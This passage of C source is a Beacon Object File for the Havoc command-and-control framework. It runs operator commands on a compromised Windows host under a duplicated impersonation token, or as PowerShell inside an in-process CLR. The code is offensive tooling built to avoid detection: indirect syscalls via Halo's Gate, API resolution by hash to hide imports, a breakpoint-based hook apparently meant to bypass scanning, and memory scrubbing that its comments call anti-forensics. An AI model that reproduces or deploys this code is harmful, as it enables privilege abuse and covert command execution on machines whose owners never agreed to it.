    int ulen = KERNEL32$WideCharToMultiByte(65001, 0, wbuf, wlen, NULL, 0, NULL, NULL);
    if (ulen <= 0) { MSVCRT$free(wbuf); return NULL; }
    /* +256 spare for timeout message appending */
    char *ubuf = (char*)MSVCRT$calloc(ulen + 256, 1);
    if (!ubuf) { MSVCRT$free(wbuf); return NULL; }
    KERNEL32$WideCharToMultiByte(65001, 0, wbuf, wlen, ubuf, ulen, NULL, NULL);

    MSVCRT$memset(wbuf, 0, wlen * sizeof(WCHAR));
    MSVCRT$free(wbuf);
    *utf8_len = ulen;
    return ubuf;
}

/* ================================================================
 * Mode 1: Execute program with thread impersonation token
 *
 * Flow:
 *   1. NtOpenThreadToken (indirect syscall)
 *   2. NtDuplicateToken -> TokenPrimary (indirect syscall)
 *   3. CreateProcessWithTokenW (ADVAPI32, requires seclogon svc)
 *   4. Wait + read pipe output
 *   5. Cleanup
 * ================================================================ */

static void ExecProcess(const char *cmdline, int cmdLen)
{
    HANDLE hR = NULL, hW = NULL;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    /* 1MB pipe buffer prevents deadlock when child writes large output
     * while BOF is blocked in NtWaitForSingleObject. Default (0) = 4KB
     * which deadlocks on anything > 4KB (e.g. ipconfig /all). */
    if (!KERNEL32$CreatePipe(&hR, &hW, &sa, 1048576)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E01");
        return;
    }

    /* 1. Open current thread's impersonation token */
    HANDLE hThrToken = NULL;
    LONG st = NTDLL$NtOpenThreadToken(
        (HANDLE)(LONG_PTR)-2,   /* NtCurrentThread */
        0x0002 | 0x0008,        /* TOKEN_DUPLICATE | TOKEN_QUERY */
        1,                      /* OpenAsSelf = TRUE (use process token for access check) */
        &hThrToken
    );
    if (st != MY_STATUS_SUCCESS || !hThrToken) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E02:%08lx", (ULONG)st);
        NTDLL$NtClose(hR); NTDLL$NtClose(hW);
        return;
    }

    /* 2. Duplicate as primary token (CreateProcessWithTokenW requires primary) */
    HANDLE hPrimary = NULL;
    st = NTDLL$NtDuplicateToken(
        hThrToken,
        MY_TOKEN_ALL_ACCESS,
        NULL,                   /* ObjectAttributes -- no SQOS needed for primary */
        FALSE,                  /* EffectiveOnly */
        MY_TokenPrimary,        /* TokenType = TokenPrimary */
        &hPrimary
    );
    NTDLL$NtClose(hThrToken); hThrToken = NULL;

    if (st != MY_STATUS_SUCCESS || !hPrimary) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E03:%08lx", (ULONG)st);
        NTDLL$NtClose(hR); NTDLL$NtClose(hW);
        return;
    }

    /* 3. Convert command line to wide string (must be writable for CreateProcessW family) */
    LPWSTR wCmd = U2W(cmdline, cmdLen);
    if (!wCmd) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E04");
        NTDLL$NtClose(hPrimary); NTDLL$NtClose(hR); NTDLL$NtClose(hW);
        return;
    }
    /* Compute wCmd length once -- needed for scrubbing in all exit paths */
    int wLen = 0; while (wCmd[wLen]) wLen++;

    /* 4. Setup STARTUPINFOW with pipe handles */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hW;
    si.hStdError  = hW;
    si.hStdInput  = NULL; /* Intentional: child gets no stdin. Works in practice
                           * for non-interactive commands (whoami, ipconfig, etc.) */

    /* 5. CreateProcessWithTokenW -- resolved via PEB walk (no ADVAPI32 DFR).
     *    LdrLoadDll ensures advapi32.dll is loaded, then ExResolve finds
     *    the function by FNV-1a hash. Eliminates __imp_ADVAPI32$ symbol. */
    WCHAR wa32[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
    MY_USTR us_a32; InitUStr(&us_a32, wa32);
    fn_LdrLoadDll pLdr = (fn_LdrLoadDll)RtResolve(H_LdrLoadDll);
    PVOID hAdv = NULL;
    if (pLdr) pLdr(NULL, NULL, &us_a32, &hAdv);
    MSVCRT$memset(wa32, 0, sizeof(wa32));
    fn_CreateProcessWithTokenW pCPWT = NULL;
    if (hAdv) pCPWT = (fn_CreateProcessWithTokenW)ExResolve(hAdv, H_CreateProcessWithTokenW);
    if (!pCPWT) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E05");
        MSVCRT$memset(wCmd, 0, wLen * sizeof(WCHAR));
        MSVCRT$free(wCmd);
        NTDLL$NtClose(hPrimary); NTDLL$NtClose(hR); NTDLL$NtClose(hW);
        return;
    }
    BOOL ok = pCPWT(
        hPrimary,
        0,                      /* dwLogonFlags = 0 (no profile load, faster) */
        NULL,                   /* lpApplicationName -- parsed from cmdline */
        wCmd,                   /* lpCommandLine -- writable buffer */
        MY_CREATE_NO_WINDOW,    /* dwCreationFlags */
        NULL, NULL,             /* environment, current dir */
        &si, &pi
    );

    /* Zero and free command line immediately */
    MSVCRT$memset(wCmd, 0, wLen * sizeof(WCHAR));
    MSVCRT$free(wCmd);
    NTDLL$NtClose(hPrimary); hPrimary = NULL;
    /* Scrub pipe handles from STARTUPINFO (anti-forensics) */
    MSVCRT$memset(&si, 0, sizeof(si));

    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E06");
        NTDLL$NtClose(hR); NTDLL$NtClose(hW);
        return;
    }

    /* 6. Close write end so ReadFile can detect EOF, then wait */
    NTDLL$NtClose(hW); hW = NULL;

    LARGE_INTEGER timeout;
    timeout.QuadPart = -300000000LL; /* 30 seconds (negative = relative, 100ns units) */
    LONG wait_st = NTDLL$NtWaitForSingleObject(pi.hProcess, FALSE, &timeout);

    /* 7. Read output, convert OEM->UTF-8, single BeaconOutput call.
     *
     * Native exe (ipconfig, systeminfo, etc.) output in OEM codepage
     * (Shift-JIS on Japanese Windows, CP437 on English, etc.).
     * Havoc console expects UTF-8. Without conversion -> mojibake. */
    int raw_len = 0;
    char *raw = ReadPipeAll(hR, &raw_len);
    NTDLL$NtClose(hR); hR = NULL;

    char *out = NULL;
    int out_len = 0;

    if (raw && raw_len > 0) {
        /* Try OEM -> UTF-8 conversion */
        int ulen = 0;
        char *utf8 = OemToUtf8(raw, raw_len, &ulen);
        if (utf8 && ulen > 0) {
            /* Conversion succeeded -- use UTF-8 buffer, free OEM raw */
            MSVCRT$memset(raw, 0, raw_len);
            MSVCRT$free(raw);
            out = utf8;
            out_len = ulen;
        } else {
            /* Conversion failed -- fall back to raw (best effort) */
            if (utf8) MSVCRT$free(utf8);
            out = raw;
            out_len = raw_len;
        }
        raw = NULL; /* ownership transferred */
    }

    if (wait_st == 0x102 /* STATUS_TIMEOUT */ && out) {
        const char *tail = "[!] Timeout (partial)\n";
        int tl = (int)MSVCRT$strlen(tail);
        if (out_len > 0 && out[out_len-1] != '\n') out[out_len++] = '\n';
        /* Safe: both ReadPipeAll and OemToUtf8 allocate +256 spare bytes */
        MSVCRT$memcpy(out + out_len, tail, tl);
        out_len += tl;
    }
    if (out && out_len > 0) {
        BeaconOutput(CALLBACK_OUTPUT, out, out_len);
    } else if (!out && wait_st == 0x102) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Timeout");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "(no output)");
    }
    if (out) { MSVCRT$memset(out, 0, out_len); MSVCRT$free(out); }
    if (raw) { MSVCRT$memset(raw, 0, raw_len); MSVCRT$free(raw); }

    /* 8. Cleanup process handles */
    NTDLL$NtClose(pi.hProcess);
    NTDLL$NtClose(pi.hThread);
}

/* ================================================================
 * Mode 0: PowerShell execution via inline CLR
 *
 * CLR Runspace creates internal threads that do NOT inherit the
 * BOF thread's impersonation token. Fix: open the thread token,
 * pass handle to PS, call WindowsIdentity.Impersonate() inside PS
 * so the Runspace thread explicitly impersonates.
 * ================================================================ */

static void ExecPS(const char *command, int cLen)
{
    /* 1. Try to get thread impersonation token for PS-side impersonation.
     * TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY = 0x000E
     *   TOKEN_DUPLICATE (0x0002): needed by WindowsIdentity ctor (DuplicateHandle)
     *   TOKEN_IMPERSONATE (0x0004): needed by .Impersonate() -> SetThreadToken
     *   TOKEN_QUERY (0x0008): needed by WindowsIdentity to read token info */
    HANDLE hThrToken = NULL;
    LONG tst = NTDLL$NtOpenThreadToken(
        (HANDLE)(LONG_PTR)-2,   /* NtCurrentThread */
        0x0002 | 0x0004 | 0x0008, /* TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY */
        1,                      /* OpenAsSelf = TRUE */
        &hThrToken
    );
    /* hThrToken may be NULL if no impersonation active (e.g. nofilter not run).
     * In that case, PS runs as the process user -- acceptable fallback. */

    HANDLE hR = NULL, hW = NULL;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    /* CRITICAL: 1MB pipe buffer. Default (0) = 4KB which causes DEADLOCK:
     *   Invoke_3 blocks BOF thread -> PS $_w.Write() fills 4KB -> WriteFile blocks
     *   -> BOF never reaches ReadPipe -> mutual deadlock -> Demon hangs forever.
     * 1MB handles any practical PS output without deadlock. */
    if (!KERNEL32$CreatePipe(&hR, &hW, &sa, 1048576)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E01");
        if (hThrToken) NTDLL$NtClose(hThrToken);
        return;
    }

    /* 2. Build PS wrapper
     *
     * CRITICAL: Pipe writer must be set up FIRST, before any impersonation.
     * If WindowsIdentity throws, we need the pipe to capture the error.
     * Impersonation goes inside the try{} block. */
    char pfx[1024];
    if (hThrToken) {
        MSVCRT$sprintf(pfx,
            "$_h=[IntPtr]::new(%lld);"
            "$_sf=New-Object Microsoft.Win32.SafeHandles.SafeFileHandle($_h,$false);"
            "$_fs=New-Object IO.FileStream($_sf,[IO.FileAccess]::Write);"
            "$_w=New-Object IO.StreamWriter($_fs,[Text.Encoding]::UTF8);"
            "$_w.AutoFlush=$true;"
            "$ErrorActionPreference='Continue';"
            "try{"
            "$__wi=[Security.Principal.WindowsIdentity]::new([IntPtr]::new(%lld));"
            "$__ic=$__wi.Impersonate();"
            "$_r=",
            (long long)(ULONG_PTR)hW,
            (long long)(ULONG_PTR)hThrToken);
    } else {
        MSVCRT$sprintf(pfx,
            "$_h=[IntPtr]::new(%lld);"
            "$_sf=New-Object Microsoft.Win32.SafeHandles.SafeFileHandle($_h,$false);"
            "$_fs=New-Object IO.FileStream($_sf,[IO.FileAccess]::Write);"
            "$_w=New-Object IO.StreamWriter($_fs,[Text.Encoding]::UTF8);"
            "$_w.AutoFlush=$true;"
            "$ErrorActionPreference='Continue';"
            "try{$_r=",
            (long long)(ULONG_PTR)hW);
    }

    /* Suffix: capture output + undo impersonation if active */
    char sfx_imp[] =
        " 2>&1|Out-String -Width 4096;"
        "if($_r){$_w.Write($_r)}else{$_w.Write('(no output)')}"
        "}catch{"
        "$_w.Write('[ERROR] '+$_.Exception.Message+\"`n\"+$_.ScriptStackTrace)"
        "}finally{"
        "if($__ic){$__ic.Undo();$__ic.Dispose()}"
        "if($__wi){$__wi.Dispose()}"
        "};"
        "$_w.Flush();$_w.Close();$_fs.Close()";

    char sfx_plain[] =
        " 2>&1|Out-String -Width 4096;"
        "if($_r){$_w.Write($_r)}else{$_w.Write('(no output)')}"
        "}catch{"
        "$_w.Write('[ERROR] '+$_.Exception.Message+\"`n\"+$_.ScriptStackTrace)"
        "};"
        "$_w.Flush();$_w.Close();$_fs.Close()";

    char *sfx = hThrToken ? sfx_imp : sfx_plain;
    int pL = (int)MSVCRT$strlen(pfx), xL = (int)MSVCRT$strlen(sfx);
    int tot = pL + cLen + xL + 1;
    char *full = (char*)MSVCRT$calloc(tot, 1);
    if (!full) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E07");
        NTDLL$NtClose(hR); NTDLL$NtClose(hW);
        if (hThrToken) NTDLL$NtClose(hThrToken);
        return;
    }
    int p = 0;
    MSVCRT$memcpy(full+p, pfx, pL); p += pL;
    MSVCRT$memcpy(full+p, command, cLen); p += cLen;
    MSVCRT$memcpy(full+p, sfx, xL); p += xL;
    full[p] = 0;

    LPWSTR wS = U2W(full, p);
    MSVCRT$memset(full, 0, tot); MSVCRT$free(full);
    if (!wS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E08");
        NTDLL$NtClose(hR); NTDLL$NtClose(hW);
        if (hThrToken) NTDLL$NtClose(hThrToken);
        return;
    }

    ICLRMetaHost*pMH=NULL; ICLRRuntimeInfo*pRI=NULL; ICorRuntimeHost*pCH=NULL;
    IUnknown*pDT=NULL; AppDomain*pAD=NULL; Assembly*pAS=NULL; MethodInfo*pMI=NULL;
    SAFEARRAY*pSA=NULL,*pAO=NULL,*pAB=NULL; BSTR bstr=NULL; PVOID hVeh=NULL;
    HRESULT hr;

    hr=MSCOREE$CLRCreateInstance(&g_CLSID_CLRMetaHost,&g_IID_ICLRMetaHost,(LPVOID*)&pMH);
    if(hr!=S_OK){BeaconPrintf(CALLBACK_ERROR,"[!] E10:%08X",hr);goto PsEnd;}
    hr=pMH->lpVtbl->GetRuntime(pMH,L"v4.0.30319",&g_IID_ICLRRuntimeInfo,(LPVOID*)&pRI);
    if(hr!=S_OK){BeaconPrintf(CALLBACK_ERROR,"[!] E11:%08X",hr);goto PsEnd;}
    BOOL ld=FALSE; pRI->lpVtbl->IsLoadable(pRI,&ld);
    if(!ld){BeaconPrintf(CALLBACK_ERROR,"[!] E12");goto PsEnd;}
    hr=pRI->lpVtbl->GetInterface(pRI,&g_CLSID_CorRuntimeHost,&g_IID_ICorRuntimeHost,(LPVOID*)&pCH);
    if(hr!=S_OK){BeaconPrintf(CALLBACK_ERROR,"[!] E13:%08X",hr);goto PsEnd;}

    pCH->lpVtbl->Start(pCH);
    hVeh = SetupBp();

    WCHAR dn[12]; RandName(dn,12,(ULONG_PTR)hW);
    hr=pCH->lpVtbl->CreateDomain(pCH,dn,NULL,&pDT);
    if(hr!=S_OK){BeaconPrintf(CALLBACK_ERROR,"[!] E14:%08X",hr);goto PsEnd;}
    hr=pDT->lpVtbl->QueryInterface(pDT,&g_IID_AppDomain,(void**)&pAD);
    if(hr!=S_OK){BeaconPrintf(CALLBACK_ERROR,"[!] E15:%08X",hr);goto PsEnd;}

    SAFEARRAYBOUND sab={PowershellRunnerSize,0};
    pSA=OLEAUT32$SafeArrayCreate(VT_UI1,1,&sab);
    if(!pSA){BeaconPrintf(CALLBACK_ERROR,"[!] E16");goto PsEnd;}
    PVOID pv=NULL;
    OLEAUT32$SafeArrayAccessData(pSA,&pv);
    MSVCRT$memcpy(pv,PowershellRunner,PowershellRunnerSize);
    OLEAUT32$SafeArrayUnaccessData(pSA);

    hr=pAD->lpVtbl->Load_3(pAD,pSA,&pAS);
    if(hr!=S_OK){BeaconPrintf(CALLBACK_ERROR,"[!] E17:%08X",hr);goto PsEnd;}
    hr=pAS->lpVtbl->EntryPoint(pAS,&pMI);
    if(hr!=S_OK){BeaconPrintf(CALLBACK_ERROR,"[!] E18:%08X",hr);goto PsEnd;}

    bstr=OLEAUT32$SysAllocString(wS);
    if(!bstr){BeaconPrintf(CALLBACK_ERROR,"[!] E19");goto PsEnd;}
    pAB=OLEAUT32$SafeArrayCreateVector(VT_BSTR,0,1);
    LONG bi=0; OLEAUT32$SafeArrayPutElement(pAB,&bi,bstr);
    VARIANT vt={0}; vt.vt=VT_ARRAY|VT_BSTR; vt.parray=pAB;
    pAO=OLEAUT32$SafeArrayCreateVector(VT_VARIANT,0,1);
    LONG oi=0; OLEAUT32$SafeArrayPutElement(pAO,&oi,&vt);
    VARIANT obj={0}; obj.vt=VT_NULL;
    VARIANT ret={0}; ret.vt=VT_EMPTY;
    pMI->lpVtbl->Invoke_3(pMI,obj,pAO,&ret);

PsEnd:
    CleanBp(hVeh);
    if(hW){NTDLL$NtClose(hW);hW=NULL;}
    /* NtDelayExecution -- manual indirect syscall (NOT in NtApi[] table)
     * SSN resolved at runtime via PEB + Halo's Gate. Executes through
     * syscall;ret gadget in ntdll. */
    { LARGE_INTEGER dly; dly.QuadPart = -1000000LL; /* 100ms */
      fn_NtDelayExecution pDE = (fn_NtDelayExecution)ScPrep(H_NtDelayExecution);
      if (pDE) pDE(0, &dly); }
    {
        int got = 0;
        char *rbuf = ReadPipeAll(hR, &got);
        if (rbuf && got > 0) {
            BeaconOutput(CALLBACK_OUTPUT, rbuf, got);
            MSVCRT$memset(rbuf, 0, got);
            MSVCRT$free(rbuf);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "(no output)");
            if (rbuf) MSVCRT$free(rbuf);
        }
    }
    if(hR){NTDLL$NtClose(hR);hR=NULL;}

    if(pAO)OLEAUT32$SafeArrayDestroy(pAO);
    if(pAB)OLEAUT32$SafeArrayDestroy(pAB);
    if(pSA)OLEAUT32$SafeArrayDestroy(pSA);
    if(pMI)pMI->lpVtbl->Release(pMI);
    if(pAS)pAS->lpVtbl->Release(pAS);
    if(pAD)pAD->lpVtbl->Release(pAD);
    if(pDT){if(pCH)pCH->lpVtbl->UnloadDomain(pCH,pDT);pDT->lpVtbl->Release(pDT);}
    if(pCH)pCH->lpVtbl->Release(pCH);
    if(pRI)pRI->lpVtbl->Release(pRI);
    if(pMH)pMH->lpVtbl->Release(pMH);
    if(bstr)OLEAUT32$SysFreeString(bstr);
    if(wS){int wl=0;while(wS[wl])wl++;MSVCRT$memset(wS,0,wl*sizeof(WCHAR));MSVCRT$free(wS);}
    if(hThrToken){NTDLL$NtClose(hThrToken);hThrToken=NULL;}
}

/* ================================================================
 * BOF entry point
 *
 * Args: int mode, str data
 *   mode 0: data = PowerShell command
 *   mode 1: data = executable command line
 *   mode 2: data = echo text (BeaconOutput with newlines preserved)
 * ================================================================ */

void go(char *args, int alen)
{
    if (alen == 0) { BeaconPrintf(CALLBACK_ERROR, "[!] E00"); return; }

    datap parser;
    BeaconDataParse(&parser, args, alen);
    int mode = BeaconDataInt(&parser);
    int dL = 0;
    char *data = BeaconDataExtract(&parser, &dL);
    if (!data || dL <= 1) { BeaconPrintf(CALLBACK_ERROR, "[!] E00"); return; }
    int dataLen = dL - 1;

    /* Mode 2: Echo — send text via BeaconOutput (preserves newlines).
     * Used by Python handler for usage/help display. */
    if (mode == 2) {
        BeaconOutput(CALLBACK_OUTPUT, data, dataLen);
        return;
    }

    /* Initialize PEB-based indirect syscall infrastructure */
    if (!ScInit()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] E09");
        return;
    }

    if (mode == 1) {
        ExecProcess(data, dataLen);
    } else {
        ExecPS(data, dataLen);
    }

    ScScrub();
}
